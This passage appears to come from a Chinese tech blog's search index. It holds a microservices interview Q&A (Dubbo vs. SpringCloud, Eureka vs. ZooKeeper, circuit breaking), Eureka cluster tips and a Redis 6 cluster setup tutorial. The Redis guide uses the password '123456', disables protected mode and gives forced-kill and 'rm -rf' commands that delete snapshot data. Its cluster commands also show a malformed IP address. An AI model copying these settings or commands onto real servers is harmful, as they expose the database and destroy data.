微服务架构的概述微服务架构是一种架构模式或者说是一种架构风格，它提倡将单一应用程序划分为一组小服务，每个服务运行在自己的独立进程中，服务间通信采用轻量级通信机制 (通常是基于 HTTP 的 RESTful API)。每个服务都围绕着具体业务进行构建，并且能够被独立地部署到生产环境、类生产环境等。另外，应该尽量避免统一的、集中式的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的编程语言、工具对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的编程语言来编写服务，也可以使用不同的数据存储技术。 微服务架构的优缺点 优点： 易于开发和维护：一个微服务只会关注一个特定的业务功能，所以它业务清晰，代码量较少 单个微服务启动较快：单个微服务代码量较少，所以启动会比较快 业务之间松耦合，无论是在开发阶段或者部署阶段，不同的服务都是互相独立的 局部修改容易部署：单体应用只要有修改，就得重新部署整个应用，微服务解决了这样的问题 技术栈不受限：在微服务架构中，可以结合项目业务及团队的特点，合理地选择技术栈 按需伸缩：可根据需求，实现细粒度的扩展 只有业务逻辑的代码，不会和 HTML、CSS 或者其他前端页面耦合，目前有两种开发模式：前后端分离、全栈开发 缺点： 运维要求高：更多的服务意味着更多的运维投入 技术开发难度高：涉及到网络通信延迟、服务容错、数据一致性、系统集成测试、系统部署依赖、性能监控等 分布式系统固有的复杂性：使用微服务架构的是分布式系统，对于一个分布式系统，系统容错，网络延迟，分布式事务等都会带来巨大的挑战 接口调整成本高：微服务之间通过接口进行通信。如果修改某一个微服务的 API，可能所有使用了该接口的微服务都需要做调整 重复劳动：很多服务可能都会使用到相同的功能，而这个功能并没有达到分解为一个微服务的程度，这个时候，可能各个服务都会开发这一功能，从而导致代码重复 SpringBoot 与 SpringCloudSpringBoot 与 SpringCloud 的关系 SpringBoot 专注于快速、方便的开发单个微服务个体，SpringCloud 则关注全局的服务治理 SpringCloud 将 SpringBoot 开发的一个个单体微服务整合并管理起来，为各个微服务之间提供配置管理、服务发现、断路器、路由、微代理、事件总线、全局锁、决策竞选、分布式会话等集成的服务 SpringBoot 可以离开 SpringCloud 独立使用开发项目，但是 SpringCloud 离不开 SpringBoot，属于依赖的关系 Dubbo 对比 SpringCloudRPC 与 REST 的区别微服务理论的提出者马丁。福勒（Martin Fowler），在其论文中可以发现其定义的服务间通信机制就是 HTTP REST。RPC 的性能比较出众，其最主要的缺陷就是服务提供方和调用方式之间依赖太强，毕竟需要为每一个微服务进行接口的定义，并通过持续集成发布，需要严格的版本控制才不会出现服务提供和调用之间因为版本不同而产生的冲突。而 REST 是轻量级的接口，服务的提供和调用不存在代码之间的耦合，只是通过一个约定进行规范，但也有可能出现文档和接口不一致而导致的服务集成问题，但可以通过 Swagger 工具整合，是代码和文档一体化解决，所以 REST 在分布式环境下比 RPC 更加灵活，这也是为什么当当网的 DubboX 在对 Dubbo 的增强中增加了对 REST 的支持的原因。 Dubbo 与 SpringCloud 的区别 功能 Dubbo SpringCloud 服务注册中心 Zookeeper、Nacos、Redis Spring Cloud Netfix Eureka 服务调用方式 RPC REST API 服务监控 Dubbo-Monitor Spring Boot Admin 熔断器 Sentinel Spring Cloud Netflix Hystrix 服务网关 无 Spring Cloud Netflix Zuul 分布式配置 Nacos Spring Cloud Config 服务跟踪 无 Spring Cloud Sleuth 数据流 无 Spring Cloud Stream 批量任务 无 Spring Cloud Task 信息总线 无 Spring Cloud Bus 最大区别：SpringCloud 抛弃了 Dubbo 的 RPC 通信，采用的是基于 HTTP 的 REST 方式。严格来说这两种技术方案各有优劣。虽然从一定程度上来说，SpringCloud 牺牲了服务调用的性能，但也避免了原生 RPC 带来的问题。而且 REST 相比 RPC 更为灵活，服务提供方和调用方的依赖只依靠一纸契约，不存在代码级别的强依赖，这在强调快速演化的微服务环境下，显得更加合适。 定位区别：Dubbo 是 SOA 时代的产物，它的关注点主要在于服务的调用，流量分发、流量监控和熔断。而 SpringCloud 诞生于微服务架构时代，考虑的是微服务治理的方方面面，另外由于依托了 Spirng、SpirngBoot 的优势之上，两个框架在开始目标就不一致，Dubbo 定位为 RPC 框架、SpirngCloud 定位为微服务架构下的一站式解决方案（微服务生态）。作为重启 Dubbo 开源项目的负责人刘军也曾表示，如果非要类比的话，Dubbo 可以类比为 Netfix OSS 技术栈，而 SpringCloud 集成了 Netfix OSS 作为分布式服务治理解决方案，但除此之外 SpringCloud 还提供了包括 config、stream、security 等等分布式问题解决方案。当前由于 RPC 协议、注册中心元数据不匹配等问题，在面临微服务基础框架选型时，Dubbo 与 SpringCloud 只能二选一。Dubbo 日后可能会积极适配到 SpringCloud 生态，比如作为 SpringCloud 的二进制通讯方案来发挥 Dubbo 的性能优势，或者 Dubbo 通过模块化以及对 HTTP 的支持适配到 SpringCloud。 品牌机与组装机的区别：Spring Cloud 的功能很明显比 Dubbo 更加强大，涵盖面更广，而且作为 Spring 的旗舰项目，它也能够与 Spring Framework、Spring Boot、Spring Data、Spring Batch 等其他 Spring 项目完美融合，这些对于微服务而言是至关重要的。使用 Dubbo 构建的微服务架构就像组装电脑，各环节选择自由度很高，但是最终结果很有可能因为一条内存质量不行就点不亮了，总是让人不怎么放心，但是如果使用者是一名高手，那这些都不是问题。而 Spring Cloud 就像品牌机，在 Spring Source 的整合下，做了大量的兼容性测试，保证了机器拥有更高的稳定性，但是如果要在使用非原装组件外的东西，就需要对其基础原理有足够的了解。 社区支持与更新力度的区别：最为重要的是，Dubbo 停止了 5 年左右的更新，虽然 2017.9 重启了。对于技术发展的新需求，需要由开发者自行拓展升级（比如当当网自研了 Dubbox），这对于很多想要采用微服务架构的中小型软件公司，显然是不太合适的。中小型软件公司没有这么强大的技术能力去修改 Dubbo 源码 + 周边的一整套解决方案，并且不是每一个公司都有阿里的大牛 + 真实的线上生产环境测试经修改过源码的框架。 其他组件对比Eureka 对比 ZooKeeper ZooKeeper 保证的是 CP，Eureka 保证的是 AP Eureka 本质上是一个工程，而 ZooKeeper 只是一个进程 ZooKeeper 有 Leader 和 Follower 角色，Eureka 各个节点是平等关系 ZooKeeper 在选举期间注册服务瘫痪，虽然服务最终会恢复，但是选举期间不可用；Eureka 只要有一实例就可以保证服务可用，但查询到的数据可能并不是最新的 ZooKeeper 采用过半数存活原则，Eureka 采用自我保护机制解决分区问题 Eureka 自我保护机制会导致： Eureka 不再从注册列表移除因长时间没收到心跳而应该过期的服务 Eureka 仍然能够接受新服务的注册和查询请求，但是不会被同步到其他节点（高可用） Eureka 在网络稳定的时候，当前实例新的注册信息会被同步到其他节点中（最终一致性） Eureka 可以很好的应对因网络故障导致部分节点失去联系的情况，而不会像 ZooKeeper 一样使得整个注册中心瘫痪 多种主流注册中心的对比 Zuul 对比 Spring Cloud Gateway 常见问答什么是服务熔断、服务降级在复杂的分布式系统中，微服务之间的相互调用，有可能出现各种各样的原因导致服务的阻塞；在高并发场景下，服务的阻塞意味着线程的阻塞，导致当前线程不可用，更严重的会让服务器线程全部阻塞，导致服务器崩溃。由于服务之间的调用关系是同步的，会对整个微服务系统造成服务雪崩。为了解决某个微服务的调用响应时间过长或者不可用进而占用越来越多的系统资源引起的雪崩效应，这就需要进行服务熔断和服务降级处理。服务熔断指的是某个服务出现故障或异常时，起到类似现实世界中的 “保险丝” 的作用，即当某个异常条件被触发就直接熔断整个服务，而不是一直等到此服务超时。简而言之，一旦发生服务雪崩就会熔断整个服务，通过维护一个线程池，当线程达到阈值的时候就启动服务降级，如果其他请求继续访问就直接返回 FallBack 的默认值。 什么是 API 网关API 网关提供 API 全托管服务，丰富的 API 管理功能，辅助企业管理大规模的 API，以降低管理成本和安全风险。其中包括： 协议适配：当对外提供服务时使用 HTTP 协议、内部服务调用时使用 RPC，此时需要协议适配 协议转发：将外部的 HTTP 请求转换为内部的 RPC 请求 安全策略（WAF）：恶意攻击、电商系统或者 O2O 系统的防刷单、Web 爬虫 系统防刷：防刷单、Web 爬虫 流量控制：限流、防 DDOS 攻击 监控日志：API 调用日志 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"Eureka 开发随笔",url:"/posts/6cbc15f0.html",text:'Eureka 搭建集群，节点均出现在 unavailable-replicas 下 Eureka 搭建高可用集群，启动多个注册中心后，节点均出现在 unavailable-replicas，查阅各类资料和测试，提供的方案如下： eureka.client.serviceUrl.defaultZone 配置项的地址，不能使用 localhost 或者内网/外网 IP，要使用域名，DNS 解析请自行配置，也可以在本机的 /etc/hosts 里映射域名 spring.application.name 要一致（默认不配置也可以） register-with-eureka 设置为 true（默认不配置也可以） 1234eureka: client: register-with-eureka: true fetch-registry: false 配置 eureka.instance.hostname (好像看到过正常情况下 Eureka 会自动拉取设备 Host，但各节点在同一机器下时请务必添加，注意各节点配置自己节点的 Host) 123eureka: instance: hostname: host1 千折腾万折腾还是不好使的时候，请去掉下面这个参数或者改为 false（神坑），未找到官方原因 123eureka: instance: prefer-ip-address: false 个人大概理解了下，prefer-ip-address: true 为不使用主机名来定义注册中心的地址，而使用 IP 地址的形式，而 defaultZone 中是以域名的方式向注册中心注册的（测试了下使用 IP 注册到备份节点不可识别），最终导致分片节点不能识别匹配（IP 地址与域名），而认为分片均处于不可达状态。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 开发随笔"},{title:"Linux 搭建 Redis 高可用集群",url:"/posts/b8e96a9f.html",text:'前言软件环境 软件 版本 CentOS 7.9 Redis 6.0.6 集群节点规划Redis 集群至少一共需要 6 个节点，包括 3 个 Master 节点和 3 个 Slave 节点，且每个 Master 节点对应 1 个 Slave 节点，对应的关系如下： 1 Master –&gt; 1 Slave，Redis 集群需要 6 个节点，如图所示 1 Master –&gt; 2 Slave，Redis 集群需要 9 个节点，以此类推，如图所示 名称 IP 端口 Master 192.168.109 7001 Master 192.168.109 7002 Master 192.168.109 7003 Slave 192.168.109 7004 Slave 192.168.109 7005 Slave 192.168.109 7006 Redis 集群特性Redis 集群的优点无中心架构，分布式提供服务。数据按照 slot 存储分布在多个 Redis 实例上。增加 Slave 做 Standby 数据副本，用于 Failover，使集群快速恢复。实现故障 Auto Failover，节点之间通过 gossip 协议交换状态信息；投票机制完成 Slave 到 Master 角色的提升。支持在线增加或减少节点，降低硬件成本和运维成本，提高系统的扩展性和可用性。 Redis 集群的缺点客户端实现复杂，驱动要求实现 Smart Client，缓存 Slots Mapping 信息并及时更新。目前仅 JedisCluster 相对成熟，异常处理部分还不完善。客户端的不成熟，影响应用的稳定性，提高开发难度。节点会因为某些原因发生阻塞（阻塞时间大于 clutser-node-timeout），被判断为下线。这种 Failover 是没有必要的，Sentinel 模式也存在这种切换场景。 Redis 集群搭建系统初始化12345678# 添加配置一# echo "net.core.somaxconn = 1024" &gt;&gt; /etc/sysctl.conf# echo "vm.overcommit_memory = 1" &gt;&gt; /etc/sysctl.conf# sysctl -p# 添加配置二# echo "echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled" &gt;&gt; /etc/rc.local# source /etc/rc.local 创建 Redis 用户12345# 创建redis用户组# groupadd redis# 创建redis用户（不允许远程登录）# useradd -g redis redis -s /bin/false Redis 编译安装Redis 各版本可以从官网下载，这里使用的版本是 6.0.6 1234567891011121314151617181920212223242526272829303132333435363738# 安装依赖# yum install -y centos-release-scl devtoolset-9 scl-utils-build tcl# 临时启用GCC9编译环境# scl enable devtoolset-9 bash# 下载文件# wget http://download.redis.io/releases/redis-6.0.6.tar.gz# 解压文件# tar -xvf redis-6.0.6.tar.gz# 进入解压目录# cd redis-6.0.6# 编译# make# 安装# make install PREFIX=/usr/local/redis# 创建软连接# ln -s /usr/local/redis/bin/redis-benchmark /usr/local/bin/redis-benchmark# ln -s /usr/local/redis/bin/redis-check-aof /usr/local/bin/redis-check-aof# ln -s /usr/local/redis/bin/redis-check-rdb /usr/local/bin/redis-check-rdb# ln -s /usr/local/redis/bin/redis-sentinel /usr/local/bin/redis-sentinel# ln -s /usr/local/redis/bin/redis-server /usr/local/bin/redis-server# ln -s /usr/local/redis/bin/redis-cli /usr/local/bin/redis-cli# 拷贝配置文件# cp redis.conf /usr/local/redis# 创建日志目录# mkdir -p /var/log/redis# 文件授权# chown -R redis:redis /var/log/redis# chown -R redis:redis /usr/local/redis 更改 Redis 的基础配置内容，其中有些配置文件的文件名都包含了端口号，是为了后面方便使用不同的端口号来区分各个节点 1234567891011121314# 更改基础配置# vim /usr/local/redis/redis.confio-threads 2daemonize yes# bind 127.0.0.1protected-mode nomasterauth 123456requirepass 123456dbfilename dump_6379.rdbpidfile /var/run/redis_6379.pidcluster-config-file nodes_6379.confappendfilename "appendonly_6379.aof"logfile "/var/log/redis/redis_6379.log" 验证 Redis 是否安装成功 12345678910111213141516# 切换Redis用户# su redis# 进入安装目录$ cd /usr/local/redis# 启动Redis$ ./bin/redis-server redis.conf# 查看Redis的运行状态$ ps -aux|grep redis# 关闭Redis$ ./bin/redis-cli127.0.0.1:6379&gt; auth 123456127.0.0.1:6379&gt; shutdown Redis 搭建集群创建 Redis 集群各节点的安装文件，并更改与端口相关的所有配置内容（例如：port、pidfile、dbfilename、logfile、cluster-config-file），同时开启对集群的支持 1234567891011121314151617181920212223242526# 创建集群目录# mkdir -p /usr/local/redis-cluster# 拷贝各节点的安装文件# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7001# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7002# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7003# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7004# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7005# cp -r /usr/local/redis /usr/local/redis-cluster/redis-7006# 更改各节点里与端口相关的所有配置项# sed -i "s/6379/7001/g" /usr/local/redis-cluster/redis-7001/redis.conf# sed -i "s/6379/7002/g" /usr/local/redis-cluster/redis-7002/redis.conf# sed -i "s/6379/7003/g" /usr/local/redis-cluster/redis-7003/redis.conf# sed -i "s/6379/7004/g" /usr/local/redis-cluster/redis-7004/redis.conf# sed -i "s/6379/7005/g" /usr/local/redis-cluster/redis-7005/redis.conf# sed -i "s/6379/7006/g" /usr/local/redis-cluster/redis-7006/redis.conf# 开启各节点对集群的支持# sed -i "s/# cluster-enabled/cluster-enabled/g" `find /usr/local/redis-cluster -type f -name "redis.conf"`# sed -i "s/# cluster-config-file/cluster-config-file/g" `find /usr/local/redis-cluster -type f -name "redis.conf"`# sed -i "s/# cluster-node-timeout/cluster-node-timeout/g" `find /usr/local/redis-cluster -type f -name "redis.conf"`# 文件授权# chown -R redis:redis /usr/local/redis-cluster 拷贝 Redis 的集群管理工具 12345678# 进入Redis的解压目录# cd redis-6.0.6# 拷贝集群管理工具# cp src/redis-trib.rb /usr/local/redis-cluster# 文件授权# chown -R redis:redis /usr/local/redis-cluster/redis-trib.rb 创建 Shell 脚本批量启动 Redis 集群的各个节点 12345678910111213141516171819202122# vim /usr/local/redis-cluster/start-cluster.sh#!/bin/bashREDIS_CLUSTER_HOME=/usr/local/redis-clustercd $REDIS_CLUSTER_HOMEcd redis-7001./bin/redis-server redis.confcd ..cd redis-7002./bin/redis-server redis.confcd ..cd redis-7003./bin/redis-server redis.confcd ..cd redis-7004./bin/redis-server redis.confcd ..cd redis-7005./bin/redis-server redis.confcd ..cd redis-7006./bin/redis-server redis.conf Shell 脚本授权执行 123# 文件授权# chmod +x /usr/local/redis-cluster/start-cluster.sh# chown -R redis:redis /usr/local/redis-cluster/start-cluster.sh Redis 集群设置密码若需要对集群各节点设置密码，那么 requirepass 和 masterauth 都需要同时设置，且两者的密码必须一致，否则发生主从切换时，就会遇到授权问题。值得一提的是，在使用 redis-trib.rb 或者 redis-cli 构建集群的时候，两者设置密码的方式是不一样的，具体如下： redis-trib.rb：如果是使用 redis-trib.rb 工具构建集群，集群构建完成前不要配置密码，集群构建完毕需要执行以下命令逐个节点机器设置密码，不需要重启节点 1234$ redis-cli -c -p 7001config set masterauth 123456config set requirepass 123456config rewrite redis-cli：如果是使用 redis-cli 构建集群，首先需要在集群各节点的 redis.conf 中配置密码，包括 requirepass 和 masterauth，然后在构建集群的命令行里加入 -a password 参数，其中的 password 就是集群各节点的密码 12masterauth 123456requirepass 123456 12345678$ redis-cli -a 123456 --cluster create \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 \\--cluster-replicas 1 Redis 集群构建启动首先执行 Shell 脚本批量启动所有 Redis 节点，切记不能以 Root 用户的身份启动 Redis，否则会造成系统重大安全隐患 123456789101112131415# 切换到Redis用户# su redis# 启动集群节点$ ./usr/local/redis-cluster/start-cluster.sh# 查看各节点的运行状态$ ps -aux|grep redisredis 32641 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7001 [cluster]redis 32649 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7002 [cluster]redis 32657 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7003 [cluster]redis 20814 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7004 [cluster]redis 20822 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7005 [cluster]redis 20830 0.0 0.0 181880 7688 ? Ssl 21:33 0:00 ./bin/redis-server *:7006 [cluster] 使用 redis-trib.rb 工具构建集群时，在 6.0.6 里面会给打印提示，让你使用 redis-cli 命令来构建集群，并提供给你需要使用的命令，使其和 redis-trib.rb 达到一致的效果（这样就可以不用再单独的安装 Ruby），原本使用 redis-trib.rb 的语句如下 1234567$ ./redis-trib.rb create --replicas 1 \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 提供使用的 redis-cli 的语句如下，建议使用 redis-cli 命令来构建 Redis 集群，因为这样就不需要额外安装 Ruby 12345678$ redis-cli -a 123456 --cluster create \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 \\--cluster-replicas 1 可以看出两个语句都差不多，而且语句意思也差不多，--cluster-replicas 1 表示主备的比例关系为 1，即一个主节点对应一个备节点，前三个 ip:port 默认表示主节点，后面的依次为前三个主节点的备节点。在生产环境使用多台服务器搭建 Redis 集群时，为了保证高可用（在任意一台服务器挂了的情况下都不影响 Redis 集群的使用），主备节点不可以部署在同一台服务器上，因为主备节点在同一台服务器上，则备节点也没有太大的意义了，所以要错开对应。当主节点宕机后，备节点可以充当主节点继续工作，使 Redis 集群正常运行。 执行完构建集群的命令后（只需执行一次），Redis 默认罗列出集群的对应关系来让你确定，输入 yes 完成集群创建即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&gt;&gt;&gt; Performing hash slots allocation on 6 nodes...Master[0] -&gt; Slots 0 - 5460Master[1] -&gt; Slots 5461 - 10922Master[2] -&gt; Slots 10923 - 16383Adding replica 192.168.1.109:7006 to 192.168.1.109:7001Adding replica 192.168.1.109:7003 to 192.168.1.109:7004Adding replica 192.168.1.109:7005 to 192.168.1.109:7002M: 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001 slots:[0-5460] (5461 slots) masterM: 283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002 slots:[10923-16383] (5461 slots) masterM: 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004 slots:[5461-10922] (5462 slots) masterS: cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003 replicates 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4S: 1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005 replicates 283abb498445ffd6206f24c451ac0b9fb7129383S: f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006 replicates 225e37e5bb340467fb58b6f9d14cfb1893bf92d5Can I set the above configuration? (type \'yes\' to accept):&gt;&gt;&gt; Nodes configuration updated&gt;&gt;&gt; Assign a different config epoch to each node&gt;&gt;&gt; Sending CLUSTER MEET messages to join the clusterWaiting for the cluster to join.&gt;&gt;&gt; Performing Cluster Check (using node 192.168.1.109:7001)M: 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001 slots:[0-5460] (5461 slots) master 1 additional replica(s)M: 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004 slots:[5461-10922] (5462 slots) master 1 additional replica(s)S: f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006 slots: (0 slots) slave replicates 225e37e5bb340467fb58b6f9d14cfb1893bf92d5S: 1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005 slots: (0 slots) slave replicates 283abb498445ffd6206f24c451ac0b9fb7129383M: 283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002 slots:[10923-16383] (5461 slots) master 1 additional replica(s)S: cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003 slots: (0 slots) slave replicates 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. 测试 Redis 集群Redis 客户端登录进某个集群节点，登录时需要指定密码，下面可以看到数据放入的哈希槽为 [12182]，属于 192.168.1.109:7002 所管控的节点，所以就直接跳转到 192.168.1.109:7002 节点来获取刚才放入的数据 12345678$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; set foo hello-&gt; Redirected to slot [12182] located at 192.168.1.109:7002OK192.168.1.109:7002&gt; get foo"hello"192.168.1.109:7002&gt; 查看 Redis 当前集群的信息 12345678910111213141516171819202122$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; cluster infocluster_state:okcluster_slots_assigned:16384cluster_slots_ok:16384cluster_slots_pfail:0cluster_slots_fail:0cluster_known_nodes:6cluster_size:3cluster_current_epoch:7cluster_my_epoch:1cluster_stats_messages_ping_sent:3154cluster_stats_messages_pong_sent:3377cluster_stats_messages_fail_sent:4cluster_stats_messages_auth-ack_sent:1cluster_stats_messages_sent:6536cluster_stats_messages_ping_received:3372cluster_stats_messages_pong_received:3154cluster_stats_messages_meet_received:5cluster_stats_messages_auth-req_received:1cluster_stats_messages_received:6532 查看 Redis 特定节点的状态 12345678910111213141516171819202122232425262728293031$ redis-cli --cluster check 192.168.1.109:7003 -a 123456Warning: Using a password with \'-a\' or \'-u\' option on the command line interface may not be safe.192.168.1.109:7003 (cde86683...) -&gt; 0 keys | 5462 slots | 1 slaves.192.168.1.109:7002 (283abb49...) -&gt; 1 keys | 5461 slots | 1 slaves.192.168.1.109:7001 (225e37e5...) -&gt; 0 keys | 5461 slots | 1 slaves.[OK] 1 keys in 3 masters.0.00 keys per slot on average.&gt;&gt;&gt; Performing Cluster Check (using node 192.168.1.109:7003)M: cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003 slots:[5461-10922] (5462 slots) master 1 additional replica(s)S: 1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005 slots: (0 slots) slave replicates 283abb498445ffd6206f24c451ac0b9fb7129383S: 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004 slots: (0 slots) slave replicates cde86683e2d314fd52cf8708f78935c6648ea3c6M: 283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002 slots:[10923-16383] (5461 slots) master 1 additional replica(s)S: f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006 slots: (0 slots) slave replicates 225e37e5bb340467fb58b6f9d14cfb1893bf92d5M: 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001 slots:[0-5460] (5461 slots) master 1 additional replica(s)[OK] All nodes agree about slots configuration.&gt;&gt;&gt; Check for open slots...&gt;&gt;&gt; Check slots coverage...[OK] All 16384 slots covered. 查看 Redis 所有集群节点的信息 123456789$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; cluster nodes7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004@17004 master - 0 1616460018217 3 connected 5461-10922225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001@17001 myself,master - 0 1616460015000 1 connected 0-5460f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006@17006 slave 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 0 1616460018000 1 connected1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005@17005 slave 283abb498445ffd6206f24c451ac0b9fb7129383 0 1616460016000 2 connected283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002@17002 master - 0 1616460016000 2 connected 10923-16383cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003@17003 slave 7a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 0 1616460017000 3 connected 验证主从切换，从上面的集群信息可以观察到 192.168.1.109:7003 节点是 192.168.1.109:7004 的 Slave 节点，因此可以 Kill 掉 192.168.1.109:7004 Master 节点的进程，然后观察 192.168.1.109:7003 节点会不会选举为新的 Master 节点，若可以则说明主从切换成功，此时 192.168.1.109:7003 节点的日志信息如下： 12345678911970:S 21 Jul 2020 22:48:40.080 * Connecting to MASTER 192.168.1.109:700411970:S 21 Jul 2020 22:48:40.080 * MASTER &lt;-&gt; REPLICA sync started11970:S 21 Jul 2020 22:48:40.081 # Error condition on socket for SYNC: Operation now in progress11970:S 21 Jul 2020 22:48:40.982 # Starting a failover election for epoch 7.11970:S 21 Jul 2020 22:48:40.985 # Failover election won: I\'m the new master.11970:S 21 Jul 2020 22:48:40.985 # configEpoch set to 7 after successful failover11970:M 21 Jul 2020 22:48:40.985 * Discarding previously cached master state.11970:M 21 Jul 2020 22:48:40.985 # Setting secondary replication ID to 00c7b21f3980b471d3373792d9d61bedf7e424e6, valid up to offset: 2059. New replication ID is c9f299ab0a8124a56d76e0e8a458135893b4533611970:M 21 Jul 2020 22:48:40.985 # Cluster state changed: ok 最后重新启动 192.168.1.109:7004 节点，可以发现它会变为 192.168.1.109:7003 节点的 Slave 节点 1234567a1229732ada6ae8d8eb51ae7b7cac6242a6f8d4 192.168.1.109:7004@17004 slave cde86683e2d314fd52cf8708f78935c6648ea3c6 0 1616461490000 7 connected225e37e5bb340467fb58b6f9d14cfb1893bf92d5 192.168.1.109:7001@17001 myself,master - 0 1616461492000 1 connected 0-5460f8a5d94e9928ed615514f23ddaabd259134af709 192.168.1.109:7006@17006 slave 225e37e5bb340467fb58b6f9d14cfb1893bf92d5 0 1616461492000 1 connected1f3f441d619ceeac55ae91015a3f46ede37352bb 192.168.1.109:7005@17005 slave 283abb498445ffd6206f24c451ac0b9fb7129383 0 1616461492010 2 connected283abb498445ffd6206f24c451ac0b9fb7129383 192.168.1.109:7002@17002 master - 0 1616461491000 2 connected 10923-16383cde86683e2d314fd52cf8708f78935c6648ea3c6 192.168.1.109:7003@17003 master - 0 1616461493010 7 connected 5461-10922 Redis 集群重建（初始化）若 Redis 集群出现无法正常使用的问题，可以尝试执行以下操作来重建 Redis 集群来解决，下述操作会删除 Redis 的所有 RDB 快照数据，切记先备份好数据再进行操作。 12345678910111213141516171819202122232425# 关闭所有节点服务器上的Redis$ pkill -9 redis# 在所有节点服务器上执行以下命令（切记先备份好Redis的快照数据）$ find /usr/local/redis-cluster -type f -iname "dump*.rdb" | xargs rm -rf$ find /usr/local/redis-cluster -type f -iname "nodes_*.conf" | xargs rm -rf$ rm -rf /var/log/redis/*# 启动所有节点服务器上的Redis$ ./usr/local/redis-cluster/start-cluster.sh# 执行集群构建操作$ redis-cli -a 123456 --cluster create \\192.168.109:7001 \\192.168.109:7002 \\192.168.109:7003 \\192.168.109:7004 \\192.168.109:7005 \\192.168.109:7006 \\--cluster-replicas 1# 查询集群信息和状态$ redis-cli -c -p 7001 -a 123456127.0.0.1:7001&gt; cluster info127.0.0.1:7001&gt; cluster nodes 参考博客 Redis 6 高可用集群搭建 Redis 两台服务器组集群 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux 缓存"},{title:"分布式唯一全局 ID 解决方案之二",url:"/posts/221613dd.html",text:'上篇 - 分布式唯一全局 ID 解决方案之一 分布式唯一全局 ID 解决方案之一 1、UidGenerator 分布式 ID 